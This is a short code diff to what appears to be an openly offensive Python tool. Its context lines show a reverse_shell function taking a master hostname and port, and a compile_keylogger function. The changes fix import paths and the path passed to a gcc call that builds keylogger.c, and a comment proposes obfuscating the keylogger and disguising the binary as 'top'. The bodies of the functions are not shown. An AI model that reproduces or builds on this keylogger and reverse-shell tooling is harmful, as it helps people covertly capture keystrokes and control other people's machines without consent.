@@ -6,7 +6,7 @@ from subprocess import run, Popen, DEVNULL
 from time import sleep
 
 
-from .crypto import crypto_run
+from utils.crypto import crypto_run
 
 
 def reverse_shell(master_hostname, shell_port):
@@ -30,7 +30,7 @@ def compile_keylogger():
         if pid2 == 0:
             # export cls="/usr/bin/gcc keylogger.c -o top"
             # code script to copy ove all c code on one file and obfuscate it as well
-            system("gcc keylogger.c -o keylogger >/dev/null 2>&1")
+            system("gcc tools/keylogger.c -o keylogger >/dev/null 2>&1")
             exit(0)
         exit(0)
 
